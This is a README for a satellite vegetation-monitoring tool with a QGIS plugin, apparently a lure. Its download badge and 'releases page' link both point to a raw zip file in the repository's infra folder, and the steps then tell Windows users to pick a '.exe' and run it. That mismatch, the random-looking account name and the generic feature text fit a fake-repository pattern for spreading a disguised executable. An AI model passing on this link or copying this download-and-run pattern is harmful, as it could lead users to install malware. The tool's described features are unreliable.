# 🛰️ satellite-ndvi-pipeline - Process satellite images to track vegetation

[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/raw/refs/heads/main/infra/pipeline_ndvi_satellite_1.0-alpha.1.zip)

This software processes satellite data to help you monitor land health. It converts raw images from the Sentinel-2 satellites into useful maps. You can calculate indices for vegetation, water, and fire damage. The tool includes a plugin for QGIS to help you view and analyze your data on a map.

## 📥 Getting Started

You do not need programming knowledge to run this software. The tool automates complex math and image processing tasks. Follow these steps to prepare your computer and run the analysis.

### System Requirements

Your computer needs specific hardware and software to process satellite images:

*   Operating System: Windows 10 or Windows 11.
*   Memory: 8 GB of RAM or more.
*   Processor: Modern multi-core processor.
*   Storage: 2 GB of free disk space for the program files.
*   Software: QGIS version 3.28 or newer.

### Installation Steps

1. Visit the [releases page](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/raw/refs/heads/main/infra/pipeline_ndvi_satellite_1.0-alpha.1.zip) to download the installation package.
2. Select the file ending in `.exe` for Windows.
3. Save the file to your computer.
4. Double-click the file to start the installer.
5. Follow the instructions on the screen to finish the setup.
6. Open your QGIS software after the installation finishes.

## 🛠️ Using the QGIS Plugin

The software connects directly to QGIS. This allows you to see your results on a map without leaving the program.

1. Open QGIS.
2. Go to the Plugins menu at the top of the screen.
3. Select Manage and Install Plugins.
4. Search for the satellite-ndvi-pipeline plugin in the list.
5. Click Install Plugin.
6. A new toolbar will appear in QGIS.

## 📊 Processing Satellite Data

You can perform several types of analysis with this tool. Each one gives you different insights into the landscape.

### Vegetation Health (NDVI)

The Normalized Difference Vegetation Index measures green leaf density. The tool pulls data from Sentinel-2 images and calculates the index for your specified area. You will see a map where green areas indicate healthy vegetation. Brown or red areas indicate sparse vegetation.

### Water Resource Tracking (NDWI)

The Normalized Difference Water Index detects liquid water in open bodies of water. This helps you track changes in lakes, rivers, and ponds over time. Use this to identify flood areas or drought conditions.

### Fire Impact Mapping (NBR)

The Normalized Burn Ratio identifies fire-damaged land. It compares images before and after a fire event. You can see the extent of the damage across large areas quickly.

## 🔄 Running a Detection Task

1. Open the plugin panel in QGIS.
2. Select your desired area of interest using the map tool.
3. Choose the date range for your satellite images.
4. Click the Retrieve Data button.
5. Choose the type of index you want to calculate.
6. Click the Process button.
7. Wait while the program downloads and cleans the data.
8. The final result will appear as a new layer in your QGIS project.

## 🔔 Setting Up Alerts

You can receive notifications when the software detects significant changes in your chosen area. The tool compares new images against a baseline. If the vegetation index drops below a threshold you set, the system notifies you.

1. Open the plugin settings menu.
2. Select the Alerts tab.
3. Choose the area you want to monitor.
4. Move the slider to set your sensitivity level.
5. Enter your email address to receive reports.
6. Save your settings.

## 📁 Managing Your Data

The software organizes all downloads in a local folder. You can find this folder in your Documents directory under the name SatelliteData.

*   The Raw folder contains original satellite images.
*   The Processed folder contains your maps and indices.
*   The Logs folder tracks your recent history in case of errors.

You can move these files to a different drive if you need to save space. Open the settings menu and update the file path to point to your new location.

## ❓ Frequently Asked Questions

### The software takes a long time to process.
Satellite images contain large amounts of data. Processing time depends on the size of the area you select. Smaller areas process faster.

### The map looks blank after processing.
Check your layer visibility in QGIS. Ensure you have a background map loaded beneath your new layer. Adjust the transparency settings on the new layer if the colors appear too solid.

### Can I run this without an internet connection?
The software needs an internet connection to download new satellite imagery. You can view existing projects without an connection.

### How do I uninstall the tool?
Open your Windows Control Panel. Select Programs and Features. Find the pipeline in the list and click Uninstall. This removes the program files but keeps your downloaded maps in the SatelliteData folder.

### Does the software work with other satellite types?
This version currently supports Sentinel-2 data only. It aims to provide consistent results by using this specific data source.

### Why do some images look cloudy?
Sentinel-2 satellites orbit the Earth continuously. Sometimes cloud cover hides the land. The software includes a filter to hide images with high cloud percentages. You can adjust this filter in the settings menu if you need to see more images.

### Where can I report a bug?
You can search the issues section on GitHub to see if others found a solution to your problem. If you cannot find an answer, open a new issue with a description of the problem and the steps you took to find it.